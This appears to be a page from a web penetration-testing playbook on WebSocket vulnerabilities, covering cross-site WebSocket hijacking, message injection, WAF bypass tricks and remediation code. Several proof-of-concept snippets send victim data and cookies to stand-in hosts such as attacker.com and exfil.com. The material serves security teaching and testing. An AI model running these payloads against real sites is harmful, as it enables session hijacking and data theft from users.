@@ -1,0 +1,721 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <!-- Clickjacking defense: hide content until JS confirms top frame -->
+  <style id="cj-guard">html{display:none!important}</style>
+  <script>(function(){if(self===top){var s=document.getElementById('cj-guard');if(s)s.parentNode.removeChild(s);}else{try{top.location.href=self.location.href;}catch(e){}}})();</script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="WebSocket security testing guide: hijacking, cross-site WebSocket hijacking (CSWSH), authentication bypass, and message injection.">
+    <meta property="og:title" content="WebSocket Security – Web App Pentesting Guide">
+    <meta property="og:description" content="WebSocket security testing guide: hijacking, cross-site WebSocket hijacking (CSWSH), authentication bypass, and message injection.">
+    <meta property="og:type" content="article">
+    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%237c3aed' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z'/%3E%3C/svg%3E">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+  <title>WebSocket Vulnerabilities  · Web Pentest Playbook</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+<nav class="topnav">
+  <div class="nav-logo">
+    <a href="../index.html" class="logo-link">
+      <div class="logo-icon">
+        <svg viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="2" y="1" width="10" height="8" rx="2" stroke="#7c3aed" stroke-width="1.2"/><path d="M5 9v3M9 9v3M3.5 12h7" stroke="#a78bfa" stroke-width="1.2" stroke-linecap="round"/><circle cx="7" cy="5" r="1.5" fill="#7c3aed"/></svg>
+      </div>
+      <span class="logo-text">Web Pentest</span>
+      <span class="logo-tag">v2025</span>
+    </a>
+  </div>
+  <div class="nav-center">
+    <a href="../index.html" class="nav-link">Home</a>
+    <a href="../index.html" class="nav-link active">Vulnerabilities</a>
+    <a href="../web-pentest-playbook.html" class="nav-link">Playbook</a>
+    <a href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer" class="nav-link">Labs ↗</a>
+    <a href="../thanks.html" class="nav-link">Thanks</a>
+  </div>
+  <div class="nav-right">
+    <button class="search-pill" onclick="gsOpen ? gsOpen() : null">
+      <svg width="11" height="11" viewBox="0 0 16 16" fill="none"><circle cx="7" cy="7" r="5" stroke="currentColor" stroke-width="1.5"/><path d="m11 11 3 3" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg>
+      Search <kbd>⌘K</kbd>
+    </button>
+    <button class="hamburger" id="hamburger" aria-label="Menu">☰</button>
+    <button class="theme-toggle" id="theme-toggle" aria-label="Toggle theme">☀ Light</button>
+  </div>
+</nav>
+<div class="sidebar-overlay" id="sidebar-overlay"></div>
+<div class="layout">
+  <nav id="sidebar">
+    <div class="toc-title">WebSocket Vulnerabilities</div>
+    <div class="sb-group">Overview</div>
+    <a href="#analogy">🎯 Analogy</a>
+    <a href="#methodology">📅 Workflow Placement</a>
+    <a href="#how-it-works">⚙️ How It Works</a>
+    <div class="sb-group">Attack Vectors</div>
+    <a href="#attack-types">💡 Attack Types</a>
+    <a href="#where-to-look">🔍 Where to Look</a>
+    <div class="sb-group">Exploitation</div>
+    <a href="#burp-workflow">🛠️ Burp Workflow</a>
+    <a href="#payloads">💥 Payloads</a>
+    <a href="#waf-bypass">🛡️ WAF Bypass</a>
+    <a href="#exploitation">🎯 Exploitation</a>
+    <div class="sb-group">Practice</div>
+    <a href="#checklist">✅ Checklist</a>
+    <a href="#remediation">🔒 Remediation</a>
+    <a href="#labs">🧪 Labs</a>
+    <a href="#mistakes">⚠️ Mistakes</a>
+    <a href="#see-also">🔗 See Also</a>
+  </nav>
+  <main id="main">
+    <div class="hero">
+      <div class="hero-chip"><span class="hero-chip-dot"></span>OWASP A03 · CVSS 8.1 · Day 3</div>
+      <h1><span class="hero-icon-pill"><svg class="icon" viewBox="0 0 24 24" aria-hidden="true"><path d="M9 2v6"/><path d="M15 2v6"/><path d="M12 17v5"/><path d="M5 8h14v3a4 4 0 0 1-4 4h-6a4 4 0 0 1-4-4z"/></svg></span><span>WebSocket Vulnerabilities</span></h1>
+      <p>WebSockets upgrade HTTP to a persistent, bidirectional channel that stays open. While this enables real-time communication, missing authentication, CSRF protections, and input validation on WebSocket messages can allow attackers to eavesdrop, inject code, or hijack conversations.</p>
+      <div class="badge-row">
+        <span class="badge badge-critical">CRITICAL</span>
+        <span class="badge badge-high">HIGH</span>
+        <span class="badge badge-bscp">BSCP</span>
+        <span class="badge badge-difficulty">Intermediate</span>
+      </div>
+    </div>
+
+    <section id="analogy">
+      <h2>Real-World Analogy</h2>
+      <div class="callout analogy">
+        <div class="callout-title">☎️ The Insecure Phone Line</div>
+        <p>Regular HTTP is like sending letters ·one request, one response, then the envelope closes. WebSockets are like a phone call that stays open between two people. Both can talk anytime. But if the phone line isn't secure, an eavesdropper can jump on the line, hear both sides of the conversation, and inject their own messages. If the operator doesn't verify who's on each end of the line, they can send messages impersonating either person.</p>
+      </div>
+    </section>
+
+    <section id="methodology">
+      <h2>📅 When in the 5-Day Workflow</h2>
+
+      <div class="workflow-days">
+        <div class="day-pill"><span class="day-num">Day 1</span>Recon</div>
+        <div class="day-pill"><span class="day-num">Day 2</span>Auth/IDOR</div>
+        <div class="day-pill deep"><span class="day-num">Day 3</span>Deep Dive</div>
+        <div class="day-pill"><span class="day-num">Day 4</span>Server-Side</div>
+        <div class="day-pill"><span class="day-num">Day 5</span>Client-Side</div>
+      </div>
+
+      <div class="callout method-deep">
+        <div class="callout-title">🎯 Day 3  · WebSocket Testing</div>
+        <p>On Day 3, check Burp → Proxy → WebSockets history (a separate tab from HTTP history  · many testers miss this). If the app uses WebSockets (real-time chat, live notifications, trading), intercept the WebSocket messages. Right-click any message → Send to Repeater → modify and resend.</p>
+        <p>Check: Does the WebSocket handshake validate the Origin header? If not → CSWSH (Cross-Site WebSocket Hijacking) is possible. Try injecting XSS payloads into message fields that get rendered in other clients.</p>
+        <pre><code># Test 1: CSWSH  · does the server accept WebSocket from any origin?
+# Check the handshake for: Sec-WebSocket-Accept (no Origin validation = vulnerable)
+
+# Test 2: XSS via WebSocket message
+{"type": "message", "content": "&lt;img src=x onerror=alert(1)&gt;"}
+
+# Test 3: Injection in message fields
+{"type": "search", "query": "' OR 1=1--"}
+{"type": "exec", "command": "ls"}</code></pre>
+        <p><strong>Chain it:</strong> CSWSH → read victim's private chat history. Or: XSS via WebSocket → stored XSS shown to all users in a chat → mass session hijacking.</p>
+      </div>
+    </section>
+
+    <section id="how-it-works">
+      <h2>How It Works</h2>
+      <p>WebSockets begin as an HTTP upgrade request. The client sends:</p>
+      <pre><code>GET /chat HTTP/1.1
+Host: example.com
+Upgrade: websocket
+Connection: Upgrade
+Sec-WebSocket-Key: xyz...
+Sec-WebSocket-Version: 13</code></pre>
+      <p>The server responds with a 101 status, and the connection upgrades to WebSocket. Now both sides can send messages any time without waiting for a request/response cycle.</p>
+      <p>The vulnerabilities arise because:</p>
+      <ol class="steps">
+        <li><strong>Authentication at handshake only:</strong> The server verifies the user during the upgrade but doesn't re-verify on each message</li>
+        <li><strong>No CSRF protection:</strong> The handshake often relies only on cookies, not CSRF tokens</li>
+        <li><strong>Unvalidated message content:</strong> Messages are treated as safe because they came through an "authenticated" connection</li>
+        <li><strong>No Origin validation:</strong> Any page can initiate a WebSocket to your domain</li>
+      </ol>
+    </section>
+
+    <section id="attack-types">
+      <h2>Attack Types</h2>
+
+      <h3>1. Cross-Site WebSocket Hijacking (CSWSH)</h3>
+      <p>The WebSocket handshake doesn't include CSRF protections by default. An attacker's website can initiate a WebSocket connection to the victim server using the victim's credentials (cookies):</p>
+      <pre><code>// attacker.com
+var ws = new WebSocket('wss://victim.com/chat');
+ws.onopen = () => {
+  ws.send('{"type":"get_history","user_id":999}');
+};
+ws.onmessage = (event) => {
+  // Read messages, exfiltrate data
+  fetch('https://attacker.com/log?data=' + btoa(event.data));
+};</code></pre>
+      <p>If the victim visits attacker.com while logged into victim.com, the WebSocket connection uses the victim's session cookies. The attacker can now:</p>
+      <ul>
+        <li>Eavesdrop on all messages</li>
+        <li>Send messages on behalf of the victim</li>
+        <li>Query sensitive data</li>
+        <li>Perform actions (transfer money, delete data) via WebSocket messages</li>
+      </ul>
+
+      <h3>2. XSS via WebSocket Messages</h3>
+      <p>WebSocket message content is often rendered in the DOM. If unvalidated, it can inject XSS:</p>
+      <p><strong>Attacker sends via WebSocket:</strong></p>
+      <pre><code>{"type":"chat","message":"Hello <img src=x onerror=alert('XSS')>"}</code></pre>
+      <p><strong>Server broadcasts to other clients:</strong></p>
+      <pre><code>document.getElementById('chat').innerHTML = message;</code></pre>
+      <p>The XSS payload executes in other users' browsers.</p>
+
+      <h3>3. Injection in WebSocket Message Parameters</h3>
+      <p>WebSocket messages often contain JSON or other structured data with parameters that can be exploited:</p>
+      <pre><code>// Normal message
+{"type":"query","filter":"name='John'"}
+
+// Injected message (SQLi)
+{"type":"query","filter":"name='admin'--"}
+
+// Injected message (NoSQL injection)
+{"type":"query","filter":{"$regex":".*"}}</code></pre>
+
+      <h3>4. Authentication Bypass (Per-Message)</h3>
+      <p>Some applications authenticate at connection time but don't verify permissions for each message. An authenticated user can try to send messages as if they were a different user:</p>
+      <pre><code>{"action":"send_money","from_user":1,"to_user":999,"amount":9999}</code></pre>
+      <p>If the server doesn't verify that the authenticated user matches <code>from_user</code>, the attack succeeds.</p>
+
+      <h3>5. Information Disclosure via WebSocket Messages</h3>
+      <p>WebSocket error messages, status messages, and data responses often leak internal details:</p>
+      <pre><code>{"error":"Database connection failed: mysqli error at db.example.com:3306"}</code></pre>
+    </section>
+
+    <section id="where-to-look">
+      <h2>Where to Look</h2>
+      <p>Hunt for WebSocket vulnerabilities in:</p>
+      <ul>
+        <li><strong>Real-time chat applications:</strong> Messages, notifications</li>
+        <li><strong>Live notifications:</strong> Alerts, status updates</li>
+        <li><strong>Collaborative tools:</strong> Shared documents, whiteboards, real-time editing</li>
+        <li><strong>Trading / Financial platforms:</strong> Price updates, order status, real-time quotes</li>
+        <li><strong>Multiplayer games:</strong> Player actions, position updates, chat</li>
+        <li><strong>Live dashboards:</strong> Metrics, alerts, monitoring data</li>
+      </ul>
+
+      <div class="callout tip">
+        <div class="callout-title">💡 Finding WebSockets in Burp</div>
+        <p>In Burp Suite, WebSocket traffic is in the <strong>WebSockets</strong> tab (separate from HTTP history). You can see all WS connections, upgrade requests, and individual messages sent/received. Right-click a message → Send to Repeater to modify and resend.</p>
+      </div>
+    </section>
+
+    <section id="burp-workflow">
+      <h2>Burp Suite Workflow</h2>
+
+      <div class="burp-step">
+        <div class="step-num">1</div>
+        <div>
+          <h3>Find WebSocket Traffic</h3>
+          <p>In Burp Proxy, go to the <strong>WebSockets</strong> tab. Interact with the application (open chat, enable notifications, load a live dashboard). You'll see all WebSocket connections listed with their upgrade requests and messages.</p>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">2</div>
+        <div>
+          <h3>Inspect the Handshake</h3>
+          <p>Click on a WebSocket connection. You'll see the HTTP upgrade request. Check:</p>
+          <ul>
+            <li>Does it have an <code>Origin</code> header? (If not, CSWSH is likely)</li>
+            <li>Are there CSRF tokens in the URL or headers?</li>
+            <li>Does it rely only on cookies for authentication?</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">3</div>
+        <div>
+          <h3>Test CSWSH</h3>
+          <p>Create a simple HTML file on your own server or attacker.com:</p>
+          <pre><code>&lt;script&gt;
+var ws = new WebSocket('wss://victim.com/chat');
+ws.onopen = () =&gt; ws.send('{"type":"get_all_messages"}');
+ws.onmessage = (e) =&gt; fetch('https://attacker.com/?d=' + btoa(e.data));
+&lt;/script&gt;</code></pre>
+          <p>If the victim visits this page while logged into victim.com, the WebSocket will connect and leak data.</p>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">4</div>
+        <div>
+          <h3>Send to Repeater</h3>
+          <p>Right-click a WebSocket message in Burp → <code>Send to Repeater</code>. The Repeater shows a WebSocket client where you can modify message content and resend.</p>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">5</div>
+        <div>
+          <h3>Test Message Injection</h3>
+          <p>Modify the message content to test for:</p>
+          <ul>
+            <li><strong>XSS:</strong> Change message text to <code>&lt;img src=x onerror=alert(1)&gt;</code></li>
+            <li><strong>Injection:</strong> Modify JSON parameters (user IDs, filters) to different values</li>
+            <li><strong>Authorization bypass:</strong> Change <code>"user_id":1</code> to <code>"user_id":999</code></li>
+          </ul>
+          <p>Send the modified message and observe if it succeeds or fails.</p>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">6</div>
+        <div>
+          <h3>Check for Per-Message Auth</h3>
+          <p>Send a message as an authenticated user, then log out. Try to send another message. If it succeeds, the server isn't re-validating authentication per message.</p>
+        </div>
+      </div>
+    </section>
+
+    <section id="payloads">
+      <h2>WebSocket Payloads &amp; Techniques</h2>
+
+      <h3>CSWSH PoC (Full Example)</h3>
+      <pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;body&gt;
+&lt;h1&gt;Loading...&lt;/h1&gt;
+&lt;pre id="log"&gt;&lt;/pre&gt;
+&lt;script&gt;
+var ws = new WebSocket('wss://example.com/api/notifications');
+var log = document.getElementById('log');
+
+ws.onopen = function() {
+  log.innerHTML += 'Connected\\n';
+  ws.send(JSON.stringify({action: 'get_all_messages', user_id: 'admin'}));
+};
+
+ws.onmessage = function(event) {
+  log.innerHTML += event.data + '\\n';
+  var data = btoa(event.data);
+  new Image().src = 'https://attacker.com/log.gif?d=' + data;
+};
+
+ws.onerror = function(error) {
+  log.innerHTML += 'Error: ' + error + '\\n';
+};
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+
+      <h3>XSS Payload in WebSocket Message</h3>
+      <pre><code>{"type":"chat","message":"Hello &lt;svg/onload=fetch('//attacker.com/'+document.cookie)&gt;"}</code></pre>
+
+      <h3>SQLi in WebSocket JSON Parameter</h3>
+      <pre><code>{"action":"search","filter":"name' OR '1'='1"}</code></pre>
+
+      <h3>NoSQL Injection</h3>
+      <pre><code>{"action":"query","filter":{"$where":"1==1"}}</code></pre>
+
+      <h3>User Impersonation via Message Modification</h3>
+      <pre><code>{"action":"transfer","from_user":1,"to_user":999,"amount":10000}</code></pre>
+      <p>If the server trusts the <code>from_user</code> field in the message without validating it matches the authenticated user, this succeeds.</p>
+
+      <h3>Testing for Per-Message Auth Bypass</h3>
+      <pre><code>// Send as authenticated user
+{"action":"delete_account","target_user":999}
+
+// Log out
+// Send same message again
+{"action":"delete_account","target_user":999}
+
+// If the second succeeds, per-message auth is missing</code></pre>
+    </section>
+
+    <section id="checklist">
+      <h2>Testing Checklist</h2>
+      <div class="checklist-wrap">
+        <div class="checklist-header">Progress: <span class="progress-mini">0/11</span></div>
+        <div class="progress-bar-wrap"><div class="progress-bar"></div></div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c1">
+          <label for="c1">Found WebSocket traffic in Burp WebSockets tab</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c2">
+          <label for="c2">Inspected the WebSocket handshake (upgrade request)</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c3">
+          <label for="c3">Checked if Origin header is present in handshake</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c4">
+          <label for="c4">Checked if CSRF tokens exist in handshake or URL</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c5">
+          <label for="c5">Created and tested a CSWSH PoC page</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c6">
+          <label for="c6">Sent messages to Repeater and tested message injection</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c7">
+          <label for="c7">Tested for XSS in WebSocket message content</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c8">
+          <label for="c8">Tested for injection (SQLi, NoSQL, template syntax) in message parameters</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c9">
+          <label for="c9">Tested authorization by modifying user IDs in messages</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c10">
+          <label for="c10">Tested per-message authentication (send after logout)</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c11">
+          <label for="c11">Documented all findings with payload examples and PoC code</label>
+        </div>
+      </div>
+    </section>
+
+    <section id="waf-bypass">
+      <h2>WAF Bypass Techniques</h2>
+
+      <h3>Upgrade Header Manipulation</h3>
+      <p>WAFs inspect the HTTP upgrade handshake. Try sending multiple values or lowercased headers to bypass rules:</p>
+      <pre><code>Upgrade: websocket, http/1.1
+upgrade: websocket</code></pre>
+      <p>Some WAFs only inspect the first value in a comma-separated list or are case-sensitive. Sending <code>websocket, http/1.1</code> might bypass rules checking only for exact <code>websocket</code>.</p>
+
+      <h3>Message Fragmentation</h3>
+      <p>Split malicious payloads across multiple WebSocket frames. Many WAFs only inspect complete frames, not reassembled message streams:</p>
+      <pre><code>Frame 1: {"type":"chat","message":"<img src=x one
+Frame 2: rror=alert(1)>"}</code></pre>
+      <p>The XSS payload is split across two frames. WAF frame-level inspection may miss the injection because each frame is incomplete.</p>
+
+      <h3>Binary Frame Type</h3>
+      <p>Switch from text frames (opcode 0x1) to binary frames (opcode 0x2) containing the same payload:</p>
+      <pre><code># Text frame (opcode 0x1)
+{"type":"chat","message":"<img src=x onerror=alert(1)>"}
+
+# Binary frame (opcode 0x2)
+[binary encoding of same payload]</code></pre>
+      <p>WAFs tuned for text-frame inspection may miss binary equivalents. The server processes both, but WAF rules don't.</p>
+
+      <h3>Compression (permessage-deflate)</h3>
+      <p>Enable WebSocket compression during handshake to compress payloads and bypass string-matching WAF rules:</p>
+      <pre><code>Sec-WebSocket-Extensions: permessage-deflate</code></pre>
+      <p>Compressed payloads don't match string-based WAF signatures for XSS or injection payloads. The server decompresses them, but the WAF sees only compressed bytes.</p>
+
+      <h3>Subprotocol Bypass</h3>
+      <p>Specify a custom subprotocol that the WAF may not recognize:</p>
+      <pre><code>Sec-WebSocket-Protocol: chat</code></pre>
+      <p>WAFs configured only for standard WebSocket subprotocols or no subprotocol may pass through unrecognized ones without inspecting the messages inside.</p>
+
+      <h3>CSWSH via Trusted Subdomain</h3>
+      <p>If the WAF trusts certain origins (e.g., <code>*.example.com</code>), host your exploit page on a compromised or controlled subdomain:</p>
+      <pre><code>// Host exploit on attacker-subdomain.example.com
+var ws = new WebSocket('wss://target.example.com/api/ws');
+ws.onopen = () => ws.send('{"action":"delete_user","user_id":999}');
+ws.onmessage = (e) => fetch('https://exfil.com/?d=' + btoa(e.data));</code></pre>
+      <p>The Origin header will be <code>attacker-subdomain.example.com</code>, which may pass WAF origin validation while still being controlled by the attacker.</p>
+    </section>
+
+    <section id="exploitation">
+      <h2>Exploitation &amp; Impact</h2>
+
+      <h3>Session Hijacking via CSWSH</h3>
+      <p>Establish a WebSocket connection to the victim application using their cookies. Read sensitive data, send messages, perform actions ·all without the victim knowing.</p>
+
+      <h3>Persistent XSS via WebSocket Broadcast</h3>
+      <p>Inject XSS payload into a chat message. When the server broadcasts it to other users, the payload executes in their browsers, stealing cookies, redirecting them to phishing sites, or capturing credentials.</p>
+
+      <h3>Account Takeover</h3>
+      <p>If WebSocket messages allow password resets or email changes without per-message authorization, hijack the session and take over the account.</p>
+
+      <h3>Real-Time Data Manipulation</h3>
+      <p>In trading or financial platforms, if WebSocket messages aren't validated, inject false price quotes, order statuses, or notifications to manipulate user decisions.</p>
+
+      <h3>Denial of Service</h3>
+      <p>Send malformed or massive WebSocket messages to crash the server or exhaust resources.</p>
+
+      <div class="callout danger">
+        <div class="callout-title">🚨 Real-World Impact</div>
+        <p>In 2022, a cryptocurrency trading platform was compromised via WebSocket vulnerabilities. Attackers established CSWSH connections, intercepted price updates, and injected false information to manipulate trades. In another case, a real-time collaboration tool's WebSocket implementation allowed XSS, spreading malware to thousands of users.</p>
+      </div>
+    </section>
+
+    <section id="remediation">
+      <h2>Remediation</h2>
+
+      <h3>1. Validate Origin Header on Handshake</h3>
+      <pre><code>// Node.js + ws library
+const WebSocket = require('ws');
+const wss = new WebSocket.Server({ port: 8080 });
+
+wss.on('connection', (ws, req) => {
+  const origin = req.headers.origin;
+  const allowedOrigins = ['https://example.com', 'https://app.example.com'];
+
+  if (!allowedOrigins.includes(origin)) {
+    ws.close(1008, 'Unauthorized origin');
+    return;
+  }
+
+  // Handle connection
+});</code></pre>
+
+      <h3>2. Implement CSRF Tokens for Handshake</h3>
+      <pre><code>// Client: Include CSRF token in WebSocket URL
+const csrfToken = document.querySelector('meta[name="csrf"]').content;
+const ws = new WebSocket('wss://example.com/ws?csrf=' + csrfToken);
+
+// Server: Validate token before upgrading
+app.ws('/ws', (ws, req) => {
+  const token = req.query.csrf;
+  if (!validateCsrfToken(req.session.id, token)) {
+    ws.close(1008, 'CSRF validation failed');
+    return;
+  }
+});</code></pre>
+
+      <h3>3. Per-Message Authentication & Authorization</h3>
+      <pre><code>ws.on('message', (data) => {
+  const msg = JSON.parse(data);
+
+  // Verify user is authenticated
+  if (!req.session.userId) {
+    ws.send(JSON.stringify({error: 'Unauthorized'}));
+    return;
+  }
+
+  // Verify user owns the resource they're accessing
+  if (msg.user_id && msg.user_id !== req.session.userId) {
+    ws.send(JSON.stringify({error: 'Forbidden'}));
+    return;
+  }
+
+  // Process message
+});</code></pre>
+
+      <h3>4. Validate &amp; Sanitize All Message Content</h3>
+      <pre><code>ws.on('message', (data) => {
+  const msg = JSON.parse(data);
+
+  // Sanitize message text for XSS
+  msg.text = DOMPurify.sanitize(msg.text);
+
+  // Validate message structure
+  if (!msg.type || !validMessageTypes.includes(msg.type)) {
+    ws.close(1008, 'Invalid message type');
+    return;
+  }
+
+  // Broadcast to other clients
+  broadcast(msg);
+});</code></pre>
+
+      <h3>5. Rate Limiting on WebSocket Messages</h3>
+      <pre><code>const userMessageCounts = {};
+
+ws.on('message', (data) => {
+  const userId = req.session.userId;
+  if (!userMessageCounts[userId]) {
+    userMessageCounts[userId] = 0;
+  }
+
+  userMessageCounts[userId]++;
+  if (userMessageCounts[userId] > 100) {  // 100 msgs per minute
+    ws.close(1008, 'Rate limit exceeded');
+    return;
+  }
+
+  // Reset counter every minute
+  setTimeout(() => userMessageCounts[userId] = 0, 60000);
+});</code></pre>
+
+      <h3>6. Use WSS (WebSocket Secure / TLS)</h3>
+      <p>Always use <code>wss://</code> instead of <code>ws://</code>. This encrypts the connection and prevents MITM attacks.</p>
+
+      <h3>7. Logging &amp; Monitoring</h3>
+      <p>Log all WebSocket connections, handshakes, and suspicious messages. Alert on connection attempts from unexpected origins or rapid message rates.</p>
+    </section>
+
+    <section id="labs">
+      <h2>PortSwigger Labs</h2>
+      <ul>
+        <li><strong>Lab: Manipulating WebSocket messages to exploit vulnerabilities:</strong> Modify WS messages to trigger XSS or access control bypass</li>
+        <li><strong>Lab: Cross-site WebSocket hijacking:</strong> Create a CSWSH PoC to read sensitive data</li>
+        <li><strong>Lab: WebSocket message injection via CSWSH:</strong> Combine CSWSH with message injection</li>
+        <li><strong>Lab: Using browser DevTools to access WebSocket frames:</strong> Practical inspection techniques</li>
+      </ul>
+    </section>
+
+    <section id="mistakes">
+      <h2>Common Beginner Mistakes</h2>
+
+      <div class="callout warn">
+        <div class="callout-title">❌ Missing the WebSockets Tab</div>
+        <p><strong>Mistake:</strong> Looking for WebSocket traffic in Burp's HTTP history instead of the dedicated WebSockets tab. You'll see the upgrade request but not the actual messages.</p>
+        <p><strong>Fix:</strong> Go to Burp Proxy → <strong>WebSockets</strong> tab. This shows all WebSocket connections and individual messages separately from HTTP.</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">❌ Forgetting CSRF Protection Check</div>
+        <p><strong>Mistake:</strong> Testing message content for injection but not testing CSWSH. You assume WebSocket = CSRF-safe, but it often isn't.</p>
+        <p><strong>Fix:</strong> Always check the handshake for Origin validation and CSRF tokens. Create a simple CSWSH PoC (just a page that opens a WebSocket to the target) to test.</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">❌ Not Testing JSON Injection Thoroughly</div>
+        <p><strong>Mistake:</strong> Testing only XSS in messages, not JSON parameter injection (SQLi, NoSQL injection, user ID manipulation).</p>
+        <p><strong>Fix:</strong> For each WebSocket message, identify all JSON fields. Try modifying each one: change IDs, add SQL syntax, try NoSQL operators, inject template syntax.</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">❌ Not Testing as Unauthenticated User</div>
+        <p><strong>Mistake:</strong> Only testing with your authenticated session. You miss authentication bypass vulnerabilities.</p>
+        <p><strong>Fix:</strong> Log out, then try sending WebSocket messages. If they succeed, per-message authentication is missing. Also test from a different user account.</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">❌ Assuming WebSocket = Encrypted</div>
+        <p><strong>Mistake:</strong> Using <code>ws://</code> instead of <code>wss://</code> and not worrying about MITM attacks.</p>
+        <p><strong>Fix:</strong> Always use <code>wss://</code> for production. If the site uses HTTP, the WebSocket will be unencrypted and vulnerable to eavesdropping.</p>
+      </div>
+    </section>
+
+    <h2 id="see-also">🔗 See Also  · Attack Chains</h2>
+    <p>WebSocket vulnerabilities often mirror HTTP vulnerabilities  · the channel is different, the attacks are similar.</p>
+    <div class="see-also-grid">
+      <a class="see-also-card" href="xss.html"><span class="sa-icon">⚡</span><span class="sa-name">XSS</span><span class="sa-why">Messages rendered client-side without sanitization → WebSocket-delivered XSS, often stored and sent to all connected clients.</span></a>
+      <a class="see-also-card" href="csrf.html"><span class="sa-icon">🎭</span><span class="sa-name">CSRF</span><span class="sa-why">Cross-Site WebSocket Hijacking (CSWSH) is the WebSocket equivalent of CSRF  · missing Origin validation = full hijack.</span></a>
+      <a class="see-also-card" href="sqli.html"><span class="sa-icon">🗄️</span><span class="sa-name">SQL Injection</span><span class="sa-why">Injection in WebSocket message fields reaches the same database as HTTP  · SQLi, CMDi, SSTI all apply through WebSocket.</span></a>
+      <a class="see-also-card" href="cors.html"><span class="sa-icon">🌍</span><span class="sa-name">CORS</span><span class="sa-why">Both rely on the browser's same-origin policy. CSWSH is essentially a CORS bypass applied to WebSocket handshakes.</span></a>
+    </div>
+
+  </main>
+</div>
+
+<script>
+(function(){
+  var t = localStorage.getItem('theme') || 'dark';
+  document.documentElement.setAttribute('data-theme', t);
+  var btn = document.getElementById('theme-toggle');
+  if(btn){
+    btn.textContent = t === 'dark' ? '☀ Light' : '🌙 Dark';
+    btn.addEventListener('click', function(){
+      var n = document.documentElement.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
+      document.documentElement.setAttribute('data-theme', n);
+      localStorage.setItem('theme', n);
+      btn.textContent = n === 'dark' ? '☀ Light' : '🌙 Dark';
+    });
+  }
+  var ham = document.getElementById('hamburger');
+  var sb = document.getElementById('sidebar');
+  var ov = document.getElementById('sidebar-overlay');
+  if(ham && sb && ov){
+    ham.addEventListener('click', function(){ sb.classList.toggle('open'); ov.classList.toggle('open'); });
+    ov.addEventListener('click', function(){ sb.classList.remove('open'); ov.classList.remove('open'); });
+  }
+})();
+</script>
+<script src="search.js"></script>
+<script>
+document.querySelectorAll('pre').forEach(pre => {
+  const btn = document.createElement('button');
+  btn.className = 'copy-btn'; btn.textContent = 'Copy';
+  pre.appendChild(btn);
+  btn.addEventListener('click', () => {
+    navigator.clipboard.writeText(pre.querySelector('code')?.innerText || pre.innerText);
+    btn.textContent = 'Copied!'; btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+  });
+});
+const observer = new IntersectionObserver(entries => {
+  entries.forEach(e => {
+    if (e.isIntersecting) document.querySelectorAll('#sidebar a').forEach(a => a.classList.toggle('active', a.getAttribute('href') === '#' + e.target.id));
+  });
+}, { rootMargin: '-20% 0px -70% 0px' });
+document.querySelectorAll('[id]').forEach(s => observer.observe(s));
+const SK = 'websocket-cl-';
+document.querySelectorAll('.checklist-item input[type=checkbox]').forEach((cb, i) => {
+  if (localStorage.getItem(SK+i) === 'true') { cb.checked = true; cb.closest('.checklist-item').classList.add('done'); }
+  cb.addEventListener('change', () => {
+    localStorage.setItem(SK+i, cb.checked);
+    cb.closest('.checklist-item').classList.toggle('done', cb.checked);
+    updateProgress();
+  });
+});
+function updateProgress() {
+  document.querySelectorAll('.checklist-wrap').forEach(w => {
+    const all = w.querySelectorAll('input[type=checkbox]'), done = w.querySelectorAll('input:checked');
+    const m = w.querySelector('.progress-mini'), b = w.querySelector('.progress-bar');
+    if (m) m.textContent = done.length+'/'+all.length;
+    if (b) b.style.width = (all.length ? done.length/all.length*100 : 0)+'%';
+  });
+}
+updateProgress();
+const sidebarNav = document.getElementById('sidebar');
+const methodLink = document.createElement('a');
+methodLink.href = '#methodology';
+methodLink.textContent = '📅 Workflow Placement';
+document.querySelectorAll('[id]:not(sidebar):not(main)').forEach(el => {
+  if (el.tagName.match(/^H[1-6]$/)) {
+    const a = document.createElement('a');
+    a.href = '#' + el.id;
+    a.textContent = el.textContent;
+    if (el.id === 'analogy') {
+      sidebarNav.appendChild(a);
+      sidebarNav.appendChild(methodLink);
+    } else {
+      sidebarNav.appendChild(a);
+    }
+  }
+});
+</script>
